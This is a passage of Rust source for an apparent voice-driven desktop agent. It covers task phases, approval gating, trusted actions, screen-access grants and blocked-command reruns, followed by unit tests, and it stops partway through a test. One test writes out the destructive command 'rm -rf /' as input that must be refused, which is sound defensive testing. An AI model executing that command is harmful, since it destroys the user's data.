//! One task at a time, explicit phases, nothing runs without approval.
//!
//! idle -> listening -> transcribing -> planning -> awaiting_approval -> running
//!      -> completed | failed | cancelled

use std::path::PathBuf;
use std::sync::{Arc, Mutex, MutexGuard};
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

use serde::Serialize;

use crate::hexcli::{Stt, SttError};
use crate::opencode::{self, Canceller, Run, RunConfig, RunStatus};
use crate::phase::Phase;
use crate::tools::{self, Action};

pub const MAX_INPUT: usize = 1500;
const MAX_EVENTS: usize = 400;

#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Mode {
    Actions,
    Work,
}

impl Mode {
    pub fn parse(s: &str) -> Result<Self, String> {
        match s {
            "actions" => Ok(Self::Actions),
            "work" => Ok(Self::Work),
            _ => Err("Mode must be actions or work".into()),
        }
    }
}

#[derive(Clone, Debug, Serialize)]
pub struct Step {
    pub title: String,
    /// pending | running | launched | done | failed
    pub status: String,
    pub risk: String,
}

#[derive(Clone, Debug, Serialize)]
pub struct Task {
    pub id: u64,
    pub mode: Mode,
    pub text: String,
    pub steps: Vec<Step>,
    pub phase: Phase,
    pub error: Option<String>,
    pub summary: Option<String>,
    pub changed_files: Option<Vec<String>>,
    pub workspace: Option<String>,
    /// Commands OpenCode asked to run that X refused; each can be allowed for one rerun.
    pub blocked: Vec<String>,
}

#[derive(Clone, Debug, Serialize)]
pub struct Event {
    pub n: u64,
    pub t: u64,
    pub kind: String,
    pub text: String,
}

#[derive(Clone, Debug, Serialize)]
pub struct Snapshot {
    pub phase: Phase,
    pub task: Option<Task>,
    pub events: Vec<Event>,
    pub workspace: Option<String>,
    pub opencode_found: bool,
    #[serde(default)]
    pub trusted_actions: bool,
    pub computer_apps: Vec<String>,
    pub computer_remote: bool,
}

/// Launches validated actions (faked in tests).
pub trait Launcher: Send + Sync {
    fn launch(&self, action: &Action) -> Result<String, String>;

    /// Waits for a window other than `before` to take focus, so typing lands in the app
    /// that was just launched. Errors when none appears.
    fn await_launched_focus(&self) -> Result<(), String> {
        Ok(())
    }
}

/// Turns speech the rules do not understand into registry actions. Its output is only
/// ever a proposal: every step is validated like any other.
pub trait Planner: Send + Sync {
    /// One raw model answer for `prompt`.
    fn complete(&self, _prompt: &str) -> Result<String, String> {
        Err("This planner cannot hold a conversation".into())
    }

    /// True when the prompt never leaves this machine.
    fn is_local(&self) -> bool {
        false
    }

    fn plan(&self, text: &str, smart: bool) -> Result<tools::Reply, String> {
        crate::planner::reply_from_text(
            &self.complete(&crate::planner::prompt(text, smart))?,
            smart,
        )
    }

    fn name(&self) -> String;
}

pub struct RealLauncher;

impl Launcher for RealLauncher {
    fn launch(&self, action: &Action) -> Result<String, String> {
        action.execute()
    }

    fn await_launched_focus(&self) -> Result<(), String> {
        tools::wait_for_launched_focus()
    }
}

struct State {
    phase: Phase,
    task: Option<Task>,
    events: Vec<Event>,
    seq: u64,
    serial: u64,
    actions: Vec<Action>,
    canceller: Option<Canceller>,
    stop_requested: bool,
    voice_mode: Mode,
    workspace: Option<PathBuf>,
    trust_actions: bool,
    grants: Vec<String>,
    computer_apps: Vec<String>,
    computer_remote: bool,
}

#[derive(Clone)]
pub struct Service {
    state: Arc<Mutex<State>>,
    stt: Arc<dyn Stt>,
    launcher: Arc<dyn Launcher>,
    opencode_exe: Arc<Mutex<Option<PathBuf>>>,
    planner: Arc<Mutex<Option<Arc<dyn Planner>>>>,
    session_root: Arc<Mutex<Option<PathBuf>>>,
    desktop: Arc<Mutex<Arc<dyn crate::desktop::Desktop>>>,
}

fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_secs())
}

impl Service {
    pub fn new(
        stt: Arc<dyn Stt>,
        launcher: Arc<dyn Launcher>,
        opencode_exe: Option<PathBuf>,
    ) -> Self {
        let state = State {
            phase: Phase::Idle,
            task: None,
            events: vec![],
            seq: 0,
            serial: 0,
            actions: vec![],
            canceller: None,
            stop_requested: false,
            trust_actions: false,
            grants: vec![],
            computer_apps: vec![],
            computer_remote: false,
            voice_mode: Mode::Actions,
            workspace: None,
        };
        Self {
            state: Arc::new(Mutex::new(state)),
            stt,
            launcher,
            opencode_exe: Arc::new(Mutex::new(opencode_exe)),
            planner: Arc::new(Mutex::new(None)),
            session_root: Arc::new(Mutex::new(None)),
            desktop: Arc::new(Mutex::new(Arc::new(crate::desktop::AgentDesktop::detect()))),
        }
    }

    fn lock(&self) -> MutexGuard<'_, State> {
        self.state.lock().unwrap_or_else(|p| p.into_inner())
    }

    pub fn emit(&self, kind: &str, text: &str) {
        emit(&mut self.lock(), kind, text);
    }

    pub fn snapshot(&self, since: u64) -> Snapshot {
        let s = self.lock();
        Snapshot {
            phase: s.phase,
            task: s.task.clone(),
            events: s.events.iter().filter(|e| e.n > since).cloned().collect(),
            workspace: s.workspace.as_ref().map(|p| p.display().to_string()),
            trusted_actions: s.trust_actions,
            computer_apps: s.computer_apps.clone(),
            computer_remote: s.computer_remote,
            opencode_found: self
                .opencode_exe
                .lock()
                .map(|e| e.is_some())
                .unwrap_or(false),
        }
    }

    pub fn set_workspace(&self, path: &str) -> Result<String, String> {
        let mut s = self.lock();
        if s.phase.is_busy() {
            return Err(busy(s.phase));
        }
        let resolved = opencode::validate_workspace(path.as_ref())?;
        let shown = resolved.display().to_string();
        emit(&mut s, "info", &format!("Workspace set to {shown}"));
        s.workspace = Some(resolved);
        Ok(shown)
    }

    // ---- planning ----------------------------------------------------------------------

    /// Opted-in Actions run as soon as they are planned: the registry holds only
    /// validated launches. Work and anything unplanned always wait for approval.
    pub fn set_trust_actions(&self, on: bool) {
        let mut s = self.lock();
        s.trust_actions = on;
        emit(
            &mut s,
            "info",
            if on {
                "Trusted Actions on"
            } else {
                "Trusted Actions off"
            },
        );
    }

    pub fn set_session_root(&self, root: PathBuf) {
        if let Ok(mut slot) = self.session_root.lock() {
            *slot = Some(root);
        }
    }

    pub fn set_desktop(&self, desktop: Arc<dyn crate::desktop::Desktop>) {
        if let Ok(mut slot) = self.desktop.lock() {
            *slot = desktop;
        }
    }

    /// Apps the person lets X read and operate. Anything else asks first, every time.
    pub fn set_computer_apps(&self, apps: Vec<String>) {
        self.lock().computer_apps = apps;
    }

    /// Whether on-screen text may be sent to a model that is not on this machine.
    pub fn set_computer_remote(&self, on: bool) {
        self.lock().computer_remote = on;
    }

    pub fn set_planner(&self, planner: Option<Arc<dyn Planner>>) {
        if let Ok(mut slot) = self.planner.lock() {
            *slot = planner;
        }
    }

    /// Rules first: they are instant and never wrong about what they accept. Only speech
    /// they do not understand goes to the model, outside the state lock.
    fn model_plan(&self, text: &str, smart: bool) -> Result<Option<Vec<Action>>, String> {
        let Some(planner) = self.planner.lock().ok().and_then(|p| p.clone()) else {
            return Ok(None);
        };
        if self.lock().phase.is_busy() {
            return Ok(None);
        }
        self.emit("info", &format!("Asking {} to plan", planner.name()));
        match planner.plan(text, smart) {
            Ok(tools::Reply::Steps(actions)) if !actions.is_empty() => Ok(Some(actions)),
            Ok(tools::Reply::Dictation) => Err(tools::NOT_A_COMMAND.into()),
            Ok(_) => Err(format!("X can't do that yet: {}", text.trim())),
            Err(error) => {
                self.emit("error", &format!("Planner: {error}"));
                Ok(None)
            }
        }
    }

    /// True when this request would go to the model (the rules do not know it).
    pub fn needs_model(&self, text: &str) -> bool {
        tools::plan_rules(text).is_none() && self.planner.lock().is_ok_and(|p| p.is_some())
    }

    pub fn plan(&self, text: &str, mode: Mode) -> Result<Task, String> {
        self.plan_with(text, mode, false)
    }

    /// Like `plan`, but the model also decides whether the speech was a command at all;
    /// `Err(NOT_A_COMMAND)` means it was dictation and nothing was planned.
    pub fn plan_smart(&self, text: &str) -> Result<Task, String> {
        self.plan_with(text, Mode::Actions, true)
    }

    fn plan_with(&self, text: &str, mode: Mode, smart: bool) -> Result<Task, String> {
        let mut preset = None;
        if mode == Mode::Actions {
            preset = tools::plan_rules(text);
            if preset.is_none() {
                preset = self.model_plan(text.trim(), smart)?;
            }
            if preset.is_none() && smart {
                return Err(tools::NOT_A_COMMAND.into());
            }
        }
        if let Some([Action::Session { goal }]) = preset.as_deref() {
            return self.plan_session(&goal.clone());
        }
        let computer_app = match preset.as_deref() {
            Some([Action::Computer { app, .. }]) => Some(app.clone()),
            _ => None,
        };
        if computer_app.is_some() {
            self.check_screen_may_leave()?;
        }
        let task = self.plan_task(text, mode, preset)?;
        if let Some(app) = computer_app {
            let granted = self.lock().computer_apps.contains(&app);
            if granted && self.lock().trust_actions {
                self.emit(
                    "info",
                    &format!("Screen access to {app} is granted: starting"),
                );
                self.approve(task.id)?;
            }
            return Ok(task);
        }
        let low_risk = tools::is_low_risk(&self.lock().actions);
        if mode == Mode::Actions && low_risk && self.lock().trust_actions {
            self.emit("info", "Trusted Actions: running without a prompt");
            self.approve(task.id)?;
        }
        Ok(task)
    }

    fn check_screen_may_leave(&self) -> Result<(), String> {
        let planner = self.planner.lock().ok().and_then(|p| p.clone());
        match planner {
            None => Err("Operating apps needs a model: set one with `agent planner`".into()),
            Some(p) if !p.is_local() && !self.lock().computer_remote => Err(format!(
                "Operating an app sends on-screen text to {}. Use a local model, or allow it with `agent computer remote on`. Nothing was done.",
                p.name()
            )),
            Some(_) => Ok(()),
        }
    }

    /// A throwaway project folder under `~/x-sessions`, then an ordinary Work task in it.
    /// The folder is never deleted for you. With Trusted Actions on the session starts
    /// at once: it is confined to the new folder and OpenCode's permission policy.
    fn plan_session(&self, goal: &str) -> Result<Task, String> {
        let root = match self.session_root.lock().ok().and_then(|r| r.clone()) {
            Some(root) => root,
            None => dirs::home_dir()
                .ok_or("No home folder for the session")?
                .join("x-sessions"),
        };
        let dir = root.join(format!("session-{}", now()));
        std::fs::create_dir_all(&dir)
            .map_err(|e| format!("Could not create {}: {e}", dir.display()))?;
        self.set_workspace(&dir.display().to_string())?;
        let task = self.plan_task(goal, Mode::Work, None)?;
        if self.lock().trust_actions {
            self.emit(
                "info",
                "Trusted Actions: starting the session without a prompt",
            );
            self.approve(task.id)?;
        }
        Ok(task)
    }

    fn plan_task(
        &self,
        text: &str,
        mode: Mode,
        preset: Option<Vec<Action>>,
    ) -> Result<Task, String> {
        let text = text.trim();
        if text.is_empty() || text.chars().count() > MAX_INPUT {
            return Err("Enter a task of 1-1,500 characters".into());
        }
        let mut s = self.lock();
        if s.phase.is_busy() {
            return Err(busy(s.phase));
        }
        s.grants.clear();
        let (steps, actions, workspace) = match mode {
            Mode::Actions => {
                let actions = preset.or_else(|| tools::plan_rules(text)).ok_or(
                    "Not understood. Try 'open Firefox' or 'search YouTube for ...'. Nothing was run.")?;
                let steps = actions
                    .iter()
                    .map(|a| Step {
                        title: a.describe(),
                        status: "pending".into(),
                        risk: if matches!(a, Action::Computer { .. }) {
                            "reads this app's screen, then clicks and types in it".into()
                        } else {
                            "launches an app".into()
                        },
                    })
                    .collect();
                (steps, actions, None)
            }
            Mode::Work => {
                let ws = s
                    .workspace
                    .clone()
                    .ok_or("Choose a project workspace first")?;
                if self
                    .opencode_exe
                    .lock()
                    .map(|e| e.is_none())
                    .unwrap_or(true)
                {
                    return Err("OpenCode CLI not found on PATH".into());
                }
                let step = |t: &str, risk: &str| Step {
                    title: t.into(),
                    status: "pending".into(),
                    risk: risk.into(),
                };
                let steps = vec![
                    step(
                        &format!("Run OpenCode in {}", ws.display()),
                        "can modify files in this folder",
                    ),
                    step("Stream agent activity", ""),
                    step("Report exit status and changed files", ""),
                ];
                (steps, vec![], Some(ws.display().to_string()))
            }
        };
        s.serial += 1;
        let task = Task {
            id: s.serial,
            mode,
            text: text.into(),
            steps,
            phase: Phase::AwaitingApproval,
            error: None,
            summary: None,
            changed_files: None,
            workspace,
            blocked: vec![],
        };
        s.phase = Phase::AwaitingApproval;
        s.actions = actions;
        s.task = Some(task.clone());
        emit(
            &mut s,
            "plan",
            &format!(
                "Planned {}: {text}",
                if mode == Mode::Work {
                    "work"
                } else {
                    "actions"
                }
            ),
        );
        Ok(task)
    }

    // ---- execution ---------------------------------------------------------------------

    pub fn approve(&self, task_id: u64) -> Result<(), String> {
        let (task, actions) = {
            let mut s = self.lock();
            let matches_task = s.task.as_ref().is_some_and(|t| t.id == task_id);
            if !matches_task || s.phase != Phase::AwaitingApproval {
                return Err("No matching task awaiting approval".into());
            }
            set_phase(&mut s, Phase::Running);
            s.stop_requested = false;
            emit(&mut s, "info", "Approved");
            (s.task.clone().ok_or("no task")?, s.actions.clone())
        };
        let me = self.clone();
        thread::spawn(move || match task.mode {
            Mode::Actions => me.run_actions(&actions),
            Mode::Work => me.run_work(&task),
        });
        Ok(())
    }

    /// Allows one command OpenCode was refused, for one rerun of the same goal. The rerun
    /// is planned like any other Work task: it still waits for approval.
    pub fn allow_once(&self, index: usize) -> Result<Task, String> {
        let (text, command) = {
            let s = self.lock();
            if s.phase.is_busy() {
                return Err(busy(s.phase));
            }
            let task = s
                .task
                .as_ref()
                .filter(|t| t.mode == Mode::Work)
                .ok_or("No Work task to rerun")?;
            let command = task
                .blocked
                .get(index)
                .ok_or("No such blocked command")?
                .clone();
            (task.text.clone(), command)
        };
        if command.contains(['*', '?', '\n']) {
            return Err("That command contains wildcards and cannot be allowed".into());
        }
        let task = self.plan_task(&text, Mode::Work, None)?;
        self.lock().grants = vec![command.clone()];
        self.emit("info", &format!("Allowing `{command}` for this rerun only"));
        Ok(task)
    }

    fn run_actions(&self, actions: &[Action]) {
        let mut launched = 0;
        for (i, action) in actions.iter().enumerate() {
            if self.lock().stop_requested {
                break;
            }
            self.set_step(i, "running");
            self.emit("action", &action.describe());
            if let Action::Computer { app, goal } = action {
                return self.run_computer(app, goal);
            }
            let result = match action {
                Action::Type { .. } => {
                    let waited = match actions.get(i.wrapping_sub(1)) {
                        Some(launched) if launched.launches_window() => {
                            self.launcher.await_launched_focus()
                        }
                        _ => Ok(()),
                    };
                    waited.and_then(|()| self.launcher.launch(action))
                }
                _ => self.launcher.launch(action),
            };
            match result {
                Ok(msg) => {
                    self.emit("result", &format!("{msg} (launched; outcome not verified)"));
                    self.set_step(i, "launched");
                    launched += 1;
                }
                Err(e) => {
                    self.set_step(i, "failed");
                    return self.finish(Phase::Failed, Some(format!("Stopped: {e}")), None, None);
                }
            }
        }
        let note = format!(
            "{} action(s) launched. X does not verify that pages loaded.",
            launched
        );
        self.finish(Phase::Completed, None, Some(note), None);
    }

    fn run_computer(&self, app: &str, goal: &str) {
        struct Link<'a>(&'a Service);
        impl crate::computer::Host for Link<'_> {
            fn emit(&self, kind: &str, text: &str) {
                self.0.emit(kind, text);
            }
            fn stopped(&self) -> bool {
                self.0.lock().stop_requested
            }
            fn open_app(&self, app: &str) -> Result<(), String> {
                self.0
                    .launcher
                    .launch(&Action::App { target: app.into() })
                    .map(drop)
            }
        }
        if let Err(why) = self.check_screen_may_leave() {
            self.set_step(0, "failed");
            return self.finish(Phase::Failed, Some(why), None, None);
        }
        let Some(planner) = self.planner.lock().ok().and_then(|p| p.clone()) else {
            self.set_step(0, "failed");
            return self.finish(Phase::Failed, Some("No model is set".into()), None, None);
        };
        let desktop = self
            .desktop
            .lock()
            .map(|d| d.clone())
            .unwrap_or_else(|p| p.into_inner().clone());
        let outcome = crate::computer::run(
            app,
            goal,
            desktop.as_ref(),
            &|prompt| planner.complete(prompt),
            &Link(self),
            &crate::computer::Limits::default(),
        );
        use crate::computer::Outcome;
        match outcome {
            Outcome::Done(note) => {
                self.set_step(0, "done");
                self.finish(Phase::Completed, None, Some(note), None);
            }
            Outcome::Cancelled => {
                self.finish(Phase::Cancelled, None, Some("Stopped".into()), None);
            }
            Outcome::Failed(why) => {
                self.set_step(0, "failed");
                self.finish(Phase::Failed, Some(why), None, None);
            }
        }
    }

    fn run_work(&self, task: &Task) {
        let (Some(exe), Some(ws)) = (
            self.opencode_exe.lock().ok().and_then(|e| e.clone()),
            task.workspace.clone(),
        ) else {
            return self.finish(
                Phase::Failed,
                Some("OpenCode or workspace missing".into()),
                None,
                None,
            );
        };
        let Ok(ws) = opencode::validate_workspace(ws.as_ref()) else {
            self.set_step(0, "failed");
            return self.finish(
                Phase::Failed,
                Some("Workspace is no longer valid".into()),
                None,
                None,
            );
        };
        if self.lock().stop_requested {
            return self.finish(
                Phase::Cancelled,
                None,
                Some("Stopped before start".into()),
                None,
            );
        }
        self.set_step(0, "running");
        let me = self.clone();
        let on_event: opencode::OnEvent = Arc::new(move |k, t| {
            let blocked = t
                .strip_prefix("Blocked bash: ")
                .filter(|_| k == "permission");
            if let (Some(command), Some(task)) = (blocked, me.lock().task.as_mut()) {
                task.blocked.push(command.to_string());
            }
            me.emit(k, t)
        });
        let mut config = RunConfig::new(exe, task.text.clone(), ws);
        config.allow_commands = std::mem::take(&mut self.lock().grants);
        let run = match Run::start(config, on_event) {
            Ok(r) => r,
            Err(e) => {
                self.set_step(0, "failed");
                return self.finish(Phase::Failed, Some(e), None, None);
            }
        };
        {
            let mut s = self.lock();
            s.canceller = Some(run.canceller());
            if s.stop_requested {
                run.cancel(); // Stop pressed before the process existed
            }
        }
        self.set_step(0, "done");
        self.set_step(1, "running");
        let res = run.join();
        self.lock().canceller = None;
        let ok = res.status == RunStatus::Completed;
        self.set_step(1, if ok { "done" } else { "failed" });
        self.set_step(2, if ok { "done" } else { "failed" });
        match res.status {
            RunStatus::Cancelled => self.finish(
                Phase::Cancelled,
                None,
                Some("Stopped. Changes may already exist on disk; nothing was rolled back.".into()),
                res.changed_files,
            ),
            RunStatus::Completed => self.finish(
                Phase::Completed,
                None,
                Some("OpenCode exited 0 with no error events.".into()),
                res.changed_files,
            ),
            RunStatus::Failed => {
                let why = if res.errors.is_empty() {
                    format!(
                        "OpenCode exited with status {}",
                        res.exit_code.map_or("unknown".into(), |c| c.to_string())
                    )
                } else {
                    res.errors.join("; ")
                };
                self.finish(Phase::Failed, Some(why), None, res.changed_files)
            }
        }
    }

    fn set_step(&self, idx: usize, status: &str) {
        if let Some(step) = self.lock().task.as_mut().and_then(|t| t.steps.get_mut(idx)) {
            step.status = status.into();
        }
    }

    fn finish(
        &self,
        phase: Phase,
        error: Option<String>,
        summary: Option<String>,
        changed: Option<Vec<String>>,
    ) {
        let mut s = self.lock();
        let phase = if s.stop_requested && phase == Phase::Completed {
            Phase::Cancelled
        } else {
            phase
        };
        if let Some(t) = s.task.as_mut() {
            t.error = error.clone();
            t.summary = summary;
            t.changed_files = changed;
        }
        set_phase(&mut s, phase);
        if let Some(e) = error {
            let seen = s
                .events
                .iter()
                .rev()
                .take(8)
                .any(|ev| ev.kind == "error" && e.contains(&ev.text));
            if !seen {
                emit(&mut s, "error", &e);
            }
        }
        emit(&mut s, "info", &format!("Task {}", phase_name(phase)));
    }

    /// Stop whatever is active: discard a plan, abort a recording, or kill a run.
    pub fn cancel(&self) {
        let mut s = self.lock();
        match s.phase {
            Phase::AwaitingApproval => {
                set_phase(&mut s, Phase::Cancelled);
                emit(&mut s, "info", "Plan discarded");
            }
            Phase::Running => {
                s.stop_requested = true;
                emit(&mut s, "info", "Stop requested");
                if let Some(c) = s.canceller.clone() {
                    drop(s);
                    c.cancel();
                }
            }
            Phase::Listening | Phase::Transcribing => {
                drop(s);
                self.voice_cancel();
            }
            _ => {}
        }
    }

    // ---- voice -------------------------------------------------------------------------

    pub fn voice_start(&self, mode: Mode) -> Result<(), String> {
        {
            let mut s = self.lock();
            if s.phase.is_busy() {
                return Err(busy(s.phase));
            }
            s.voice_mode = mode;
            set_phase(&mut s, Phase::Listening);
        }
        if let Err(e) = self.stt.start() {
            let mut s = self.lock();
            if s.phase == Phase::Listening {
                set_phase(&mut s, Phase::Idle);
            }
            return Err(e.to_string());
        }
        if self.lock().phase == Phase::Idle {
            let _ = self.stt.cancel(); // cancelled while the recording was starting
            return Ok(());
        }
        self.emit("info", "Listening (Hex microphone)");
        Ok(())
    }

    pub fn voice_stop(&self) -> Result<(), String> {
        let mode = {
            let mut s = self.lock();
            if s.phase != Phase::Listening {
                return Err("Not listening".into());
            }
            set_phase(&mut s, Phase::Transcribing);
            s.voice_mode
        };
        let me = self.clone();
        thread::spawn(move || me.transcribe(mode));
        Ok(())
    }

    fn transcribe(&self, mode: Mode) {
        let result = self.stt.stop_print();
        {
            let mut s = self.lock();
            if s.phase != Phase::Transcribing {
                return; // cancelled while Hex was transcribing
            }
            set_phase(&mut s, Phase::Idle);
        }
        match result {
            Ok(text) => {
                self.emit("heard", &text.chars().take(250).collect::<String>());
                if let Err(e) = self.plan(&text, mode) {
                    self.emit("error", &e);
                }
            }
            Err(SttError::NoSpeech) => self.emit("info", "No speech heard"),
            Err(e) => self.emit("error", &format!("Transcription failed: {e}")),
        }
    }

    pub fn voice_cancel(&self) {
        {
            let mut s = self.lock();
            if !matches!(s.phase, Phase::Listening | Phase::Transcribing) {
                return;
            }
            set_phase(&mut s, Phase::Idle);
        }
        match self.stt.cancel() {
            Ok(()) => self.emit("info", "Recording discarded"),
            Err(e) => self.emit("error", &format!("Could not cancel recording: {e}")),
        }
    }

    /// App exit: stop any run and drop any recording. Blocks until the run is reaped.
    pub fn shutdown(&self) {
        self.cancel();
        for _ in 0..200 {
            if !self.lock().phase.is_busy() {
                return;
            }
            thread::sleep(std::time::Duration::from_millis(50));
        }
    }
}

fn busy(phase: Phase) -> String {
    format!(
        "Busy ({}): finish or cancel the current task first",
        phase_name(phase)
    )
}

fn phase_name(p: Phase) -> &'static str {
    match p {
        Phase::Idle => "idle",
        Phase::Listening => "listening",
        Phase::Transcribing => "transcribing",
        Phase::Planning => "planning",
        Phase::AwaitingApproval => "awaiting_approval",
        Phase::Running => "running",
        Phase::Completed => "completed",
        Phase::Failed => "failed",
        Phase::Cancelled => "cancelled",
    }
}

fn set_phase(s: &mut State, next: Phase) {
    debug_assert!(
        s.phase == next || s.phase.can_move_to(next),
        "illegal {:?} -> {next:?}",
        s.phase
    );
    s.phase = next;
    if let Some(t) = s.task.as_mut() {
        t.phase = next;
    }
}

fn emit(s: &mut State, kind: &str, text: &str) {
    s.seq += 1;
    let (n, t) = (s.seq, now());
    s.events.push(Event {
        n,
        t,
        kind: kind.into(),
        text: text.chars().take(650).collect(),
    });
    if s.events.len() > MAX_EVENTS {
        s.events.remove(0);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::time::{Duration, Instant};

    #[derive(Default)]
    struct FakeStt {
        transcript: Mutex<Option<Result<String, SttError>>>,
        starts: AtomicUsize,
        cancels: AtomicUsize,
    }

    impl Stt for FakeStt {
        fn start(&self) -> Result<(), SttError> {
            self.starts.fetch_add(1, Ordering::SeqCst);
            Ok(())
        }
        fn stop_print(&self) -> Result<String, SttError> {
            self.transcript
                .lock()
                .unwrap()
                .take()
                .unwrap_or(Err(SttError::NoSpeech))
        }
        fn cancel(&self) -> Result<(), SttError> {
            self.cancels.fetch_add(1, Ordering::SeqCst);
            Ok(())
        }
    }

    #[derive(Default)]
    struct FakeLauncher {
        launched: Mutex<Vec<String>>,
        fail_on: Mutex<Option<String>>,
    }

    impl Launcher for FakeLauncher {
        fn launch(&self, a: &Action) -> Result<String, String> {
            if self.fail_on.lock().unwrap().as_deref() == Some(a.describe().as_str()) {
                return Err("boom".into());
            }
            self.launched.lock().unwrap().push(a.describe());
            Ok(format!("Launched {}", a.describe()))
        }
    }

    fn rig() -> (Service, Arc<FakeStt>, Arc<FakeLauncher>) {
        let (stt, l) = (
            Arc::new(FakeStt::default()),
            Arc::new(FakeLauncher::default()),
        );
        (Service::new(stt.clone(), l.clone(), None), stt, l)
    }

    fn wait_for(s: &Service, f: impl Fn(&Snapshot) -> bool) -> Snapshot {
        let end = Instant::now() + Duration::from_secs(20);
        loop {
            let snap = s.snapshot(0);
            if f(&snap) {
                return snap;
            }
            assert!(Instant::now() < end, "timed out; phase {:?}", snap.phase);
            thread::sleep(Duration::from_millis(20));
        }
    }

    #[test]
    fn nothing_runs_without_approval() {
        let (s, _, l) = rig();
        let t = s
            .plan(
                "open firefox and search youtube for mars rover",
                Mode::Actions,
            )
            .unwrap();
        assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
        thread::sleep(Duration::from_millis(100));
        assert!(l.launched.lock().unwrap().is_empty());
        assert!(s.approve(t.id + 1).is_err(), "wrong id");
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Completed);
        assert_eq!(l.launched.lock().unwrap().len(), 1);
        assert_eq!(done.task.unwrap().steps[0].status, "launched");
        assert!(
            s.approve(t.id).is_err(),
            "a finished task cannot be re-approved"
        );
    }

    #[test]
    fn trusted_actions_run_at_once_but_work_and_bad_input_still_wait() {
        let (s, _, l) = rig();
        s.set_trust_actions(true);
        s.plan("open firefox", Mode::Actions).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        assert_eq!(l.launched.lock().unwrap().len(), 1);
        assert!(s.plan("run rm -rf /", Mode::Actions).is_err());
        assert_eq!(l.launched.lock().unwrap().len(), 1);
        s.set_trust_actions(false);
        s.plan("open firefox", Mode::Actions).unwrap();
        assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
    }

    struct FakePlanner(Result<tools::Reply, String>);

    impl Planner for FakePlanner {
        fn plan(&self, _: &str, _: bool) -> Result<tools::Reply, String> {
            self.0.clone()
        }
        fn name(&self) -> String {
            "fake".into()
        }
    }

    struct ScreenPlanner {
        local: bool,
        replies: Mutex<Vec<String>>,
    }

    impl Planner for ScreenPlanner {
        fn plan(&self, _: &str, _: bool) -> Result<tools::Reply, String> {
            Ok(tools::Reply::Steps(vec![Action::Computer {
                app: "chrome".into(),
                goal: "press the button".into(),
            }]))
        }
        fn complete(&self, _: &str) -> Result<String, String> {
            Ok(self.replies.lock().unwrap().remove(0))
        }
        fn is_local(&self) -> bool {
            self.local
        }
        fn name(&self) -> String {
            "screen-fake".into()
        }
    }

    struct TwoScreens(Mutex<usize>);

    impl crate::desktop::Desktop for TwoScreens {
        fn find_window(&self, _: &str) -> Result<crate::desktop::Win, String> {
            Ok(crate::desktop::Win {
                address: "0x1".into(),
                pid: 1,
                class: "chrome".into(),
                title: "Test".into(),
                id: "w".into(),
            })
        }
        fn observe(&self, _: &crate::desktop::Win) -> Result<crate::desktop::Observation, String> {
            let clicked = *self.0.lock().unwrap() > 0;
            Ok(crate::desktop::Observation {
                snapshot: "s".into(),
                title: "Test".into(),
                elements: vec![crate::desktop::Element {
                    id: "e1".into(),
                    reference: "@s:e1".into(),
                    role: "button".into(),
                    name: "Press me".into(),
                    value: String::new(),
                    actions: vec!["Click".into()],
                }],
                texts: vec![if clicked { "clicked" } else { "idle" }.into()],
            })
        }
        fn act(&self, _: &crate::desktop::Win, _: &crate::desktop::UiAct) -> Result<(), String> {
            *self.0.lock().unwrap() += 1;
            Ok(())
        }
    }

    fn screen_rig(local: bool) -> Service {
        let (s, _, _) = rig();
        s.set_desktop(Arc::new(TwoScreens(Mutex::new(0))));
        s.set_planner(Some(Arc::new(ScreenPlanner {
            local,
            replies: Mutex::new(vec![
                r#"{"do":"click","id":"e1"}"#.into(),
                r#"{"done":true,"evidence":"clicked"}"#.into(),
            ]),
        })));
        s
    }

    #[test]
    fn screen_access_needs_a_grant_a_trusted_mode_and_a_local_or_allowed_model() {
        let s = screen_rig(false);
        let refused = s
            .plan("press the button in chrome", Mode::Actions)
            .unwrap_err();
        assert!(refused.contains("sends on-screen text"), "{refused}");
        assert_eq!(s.snapshot(0).phase, Phase::Idle);

        let s = screen_rig(true);
        s.set_trust_actions(true);
        let t = s.plan("press the button in chrome", Mode::Actions).unwrap();
        assert_eq!(
            s.snapshot(0).phase,
            Phase::AwaitingApproval,
            "ungranted app asks"
        );
        assert!(t.steps[0].risk.contains("screen"));
        s.cancel();

        s.set_computer_apps(vec!["chrome".into()]);
        s.plan("press the button in chrome", Mode::Actions).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Completed);
        assert!(done.task.unwrap().summary.unwrap().contains("clicked"));
        assert!(done.events.iter().any(|e| e.kind == "verify"));
    }

    #[test]
    fn a_remote_model_may_see_the_screen_only_after_the_person_allows_it() {
        let s = screen_rig(false);
        s.set_computer_remote(true);
        s.plan("press the button in chrome", Mode::Actions).unwrap();
        assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
    }

    #[test]
    fn the_model_only_plans_what_the_rules_do_not_understand() {
        let (s, _, l) = rig();
        let terminal = Action::App {
            target: "terminal".into(),
        };
        let typed = Action::Type {
            text: "welcome back wiki".into(),
        };
        s.set_planner(Some(Arc::new(FakePlanner(Ok(tools::Reply::Steps(vec![
            terminal, typed,
        ]))))));
        let t = s
            .plan("pop open a shell and greet the wiki", Mode::Actions)
            .unwrap();
        assert_eq!(t.steps.len(), 2);
        assert_eq!(
            s.snapshot(0).phase,
            Phase::AwaitingApproval,
            "approval unless trusted"
        );
        s.cancel();
        let rules = s.plan("open firefox", Mode::Actions).unwrap();
        assert_eq!(
            rules.steps.len(),
            1,
            "rules win; the model was not consulted"
        );
        s.cancel();
        s.set_planner(Some(Arc::new(FakePlanner(Err("down".into())))));
        assert!(s.plan("do a barrel roll", Mode::Actions).is_err());
        assert!(
            s.snapshot(0)
                .events
                .iter()
                .any(|e| e.text.contains("Planner: down"))
        );
        assert!(l.launched.lock().unwrap().is_empty());
    }

    #[test]
    fn dictation_is_not_a_command_and_plans_nothing() {
        let (s, _, l) = rig();
        s.set_planner(Some(Arc::new(FakePlanner(Ok(tools::Reply::Dictation)))));
        assert_eq!(
            s.plan_smart("remember to buy milk tomorrow").unwrap_err(),
            tools::NOT_A_COMMAND
        );
